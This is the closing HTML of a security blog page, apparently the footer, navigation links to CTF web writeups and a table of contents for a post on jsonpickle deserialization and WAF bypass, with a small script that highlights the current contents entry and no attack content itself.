+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">第十届 “磐石行动” 初赛 2025 Web Writeup</div>
+          </div>
+        </a><a href="/posts/%E5%AE%81%E6%B3%A2%E8%B5%9B-2025-web-writeup/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">天一永安杯 2025 Web Writeup</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#jsonpickle">JsonPIckle</a>
+      <ul>
+        <li><a href="#反序列化流程分析">反序列化流程分析</a></li>
+        <li><a href="#标签解析">标签解析</a>
+          <ul>
+            <li><a href="#pyobject-标签"><code>py/object</code> 标签</a></li>
+            <li><a href="#pysetpytuple-标签"><code>py/set、py/tuple</code> 标签</a></li>
+            <li><a href="#pytype-标签"><code>py/type</code> 标签</a></li>
+          </ul>
+        </li>
+        <li><a href="#waf-绕过">WAF 绕过</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/json-viewer-element/json-viewer-element.umd.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/7d78194e3d06739eec9968e2a74ec200.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
